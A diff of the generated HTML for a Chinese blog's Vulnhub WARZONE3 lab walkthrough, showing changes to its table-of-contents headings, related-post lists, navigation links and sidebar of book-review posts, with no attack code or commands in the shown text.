href="#002-ftp%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE-jd-gui%E8%AF%BBjar%E6%96%87%E4%BB%B6sha-256-%E5%8A%A0%E5%AF%86java%E8%A7%A3%E5%AF%86"><span class="toc-number">4.</span> <span class="toc-text"> 002 ftp 匿名访问、jd-gui 读 jar 文件，SHA 256 加密，java 解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-jar%E5%8F%8D%E7%BC%96%E8%AF%91java%E8%84%9A%E6%9C%AC%E8%A7%A3%E5%AF%86aessshpass%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA"><span class="toc-number">5.</span> <span class="toc-text"> 003 jar 反编译，java 脚本解密 AES，sshpass 命令行连接靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%9D%A5%E4%BF%AE%E6%94%B9%E4%B8%BB%E5%87%BD%E6%95%B0%E5%AF%86%E9%92%A5%E7%BB%B4%E6%8C%81%E4%B8%8D%E5%8F%98%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E7%9A%84%E8%A7%A3%E5%AF%86%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%92%8C%E8%A7%A3%E5%AF%86%E5%90%8E%E7%9A%84%E6%96%87%E4%BB%B6%E4%BF%9D"><span class="toc-number">6.</span> <span class="toc-text"> 再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E8%B7%AF%E5%BE%84%E5%B9%B6%E4%B8%94%E8%B0%83%E7%94%A8%E8%A7%A3%E5%AF%86%E6%96%B9%E6%B3%95%E6%9C%80%E5%90%8E%E5%B0%86%E6%88%91%E4%BB%AC%E8%A7%A3%E5%AF%86%E5%90%8E%E7%9A%84%E5%86%85%E5%AE%B9%E6%9F%A5%E7%9C%8B"><span class="toc-number">7.</span> <span class="toc-text"> 存路径，并且调用解密方法，最后将我们解密后的内容查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text"> }</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">9.</span> <span class="toc-text"> }</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%AD%A4%E6%96%87%E4%BB%B6%E4%B9%8B%E5%90%8E%E5%8D%B3%E5%8F%AF%E4%BB%A5%E5%9C%A8%E8%87%AA%E5%B7%B1%E8%AE%BE%E7%BD%AE%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%89%BE%E5%88%B0%E6%88%91%E4%BB%AC%E7%9A%84%E8%A7%A3%E5%AF%86%E6%96%87%E4%BB%B6%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E8%A7%A3"><span class="toc-number">10.</span> <span class="toc-text"> 运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%B8%80%E4%B8%8B%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E6%AD%A3%E7%A1%AE"><span class="toc-number">11.</span> <span class="toc-text"> 检查一下用户名和密码文件是否正确</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004-gpg%E8%A7%A3%E5%AF%86%E6%96%87%E4%BB%B6java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E7%BC%96%E5%86%99java%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81"><span class="toc-number">12.</span> <span class="toc-text"> 004 gpg 解密文件，java 源码分析，编写 java 解密代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E8%80%8C%E7%9B%B4%E6%8E%A5%E8%A7%A3%E5%AF%86%E6%98%AF%E5%8F%AF%E4%BB%A5%E5%BC%B9%E5%87%BA%E6%9D%A5%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E7%9A%84%E7%95%8C%E9%9D%A2%E7%9A%84"><span class="toc-number">13.</span> <span class="toc-text"> 然而直接解密是可以弹出来输入密码的界面的，</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-3"><span class="toc-number">14.</span> <span class="toc-text"> }</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="toc-number">1.</span> <span class="toc-text"> 确认攻击目标</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp-%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="toc-number">2.</span> <span class="toc-text"> FTP 匿名访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text"> java 代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E8%84%9A%E6%9C%AC%E8%A7%A3%E5%AF%86aes"><span class="toc-number">4.</span> <span class="toc-text"> java 脚本解密 AES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sshpass-%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA"><span class="toc-number">5.</span> <span class="toc-text"> sshpass 连接靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">6.</span> <span class="toc-text"> java 代码分析</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li class="active"><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li>
+          <li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li class="active"><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
@@ -593,12 +516,12 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+        <a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+        <a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -620,20 +543,10 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/107%20RECON/" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></span>
+    <span><a href="/2019/07/01/BOOK/18%E3%80%8A%E5%A4%A9%E6%96%B9%E5%A4%9C%E8%B0%AD%E3%80%8B%E7%BA%B3%E8%AE%AD/" title="《天方夜谭》纳训">《天方夜谭》纳训</a></span>
   </li>
 
       
@@ -643,7 +556,7 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
 <a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2019/07/01/BOOK/51%E3%80%8A%E6%9D%82%E8%8D%89%E4%B8%9B%E7%94%9F%E7%9A%84%E8%84%91%E8%A2%8B%E3%80%8B%E5%8D%95%E4%BA%BA%E5%85%84%E5%BC%9F/" title="《杂草丛生的脑袋》单人兄弟">《杂草丛生的脑袋》单人兄弟</a></span>
+    <span><a href="/2019/07/01/BOOK/55%E3%80%8A%E7%BE%8E%E4%B8%BD%E6%96%B0%E4%B8%96%E7%95%8C%E3%80%8B%E9%98%BF%E9%81%93%E5%8F%B8%C2%B7%E8%B5%AB%E8%83%A5%E9%BB%8E/" title="《美丽新世界》阿道司·赫胥黎">《美丽新世界》阿道司·赫胥黎</a></span>
   </li>
 
       
@@ -653,7 +566,27 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
 <a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2019/07/01/BOOK/20%E3%80%8A%E5%B0%91%E5%B9%B4%E7%BB%B4%E7%89%B9%E4%B9%8B%E7%83%A6%E6%81%BC%E3%80%8B%E7%BA%A6%E7%BF%B0%C2%B7%E6%B2%83%E5%B0%94%E5%A4%AB%E5%86%88%C2%B7%E6%AD%8C%E5%BE%B7/" title="《少年维特之烦恼》约翰·沃尔夫冈·歌德">《少年维特之烦恼》约翰·沃尔夫冈·歌德</a></span>
+    <span><a href="/2019/07/01/BOOK/48%E3%80%8A%E4%B8%80%E5%8F%A5%E9%A1%B6%E4%B8%80%E4%B8%87%E5%8F%A5%E3%80%8B%E5%88%98%E9%9C%87%E4%BA%91/" title="《一句顶一万句》刘震云">《一句顶一万句》刘震云</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/2%E3%80%8A%E5%B0%91%E6%9C%89%E4%BA%BA%E8%B5%B0%E7%9A%84%E8%B7%AF%E3%80%8B%E6%96%AF%E7%A7%91%E7%89%B9%C2%B7%E6%B4%BE%E5%85%8B/" title="《少有人走的路》斯科特·派克">《少有人走的路》斯科特·派克</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/41%E3%80%8A%E4%BA%BA%E7%94%9F%E7%9A%84%E6%9E%B7%E9%94%81%E3%80%8B%E6%AF%9B%E5%A7%86/" title="《人生的枷锁》毛姆">《人生的枷锁》毛姆</a></span>
   </li>
 
       
@@ -670,10 +603,20 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></span>
+    <span><a href="/2019/07/01/BOOK/44%E3%80%8A%E5%8F%8C%E5%9F%8E%E8%AE%B0%E3%80%8B%E6%9F%A5%E5%B0%94%E6%96%AF%C2%B7%E7%8B%84%E6%9B%B4%E6%96%AF/" title="《双城记》查尔斯·狄更斯">《双城记》查尔斯·狄更斯</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/68%E3%80%8A%E7%81%B5%E9%AD%82%E5%8F%AA%E8%83%BD%E7%8B%AC%E8%A1%8C%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/" title="《灵魂只能独行》周国平">《灵魂只能独行》周国平</a></span>
   </li>
 
       
@@ -683,37 +626,17 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
 <a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></span>
+    <span><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/132%20JETTY/" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
-</div>
-
-    <span><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></span>
+    <span><a href="/2023/05/01/SAFE/Trojan/" title="Trojan 生成">Trojan 生成</a></span>
   </li>
 
   </ul>
@@ -738,13 +661,13 @@ System.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</p>
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="站点总字数">746k 字</span>
+    <span title="站点总字数">747k 字</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="站点阅读时长">20:44</span>
+    <span title="站点阅读时长">20:46</span>
   </div>
 
 <!--   自定义开启一个网站的运行时间 -->
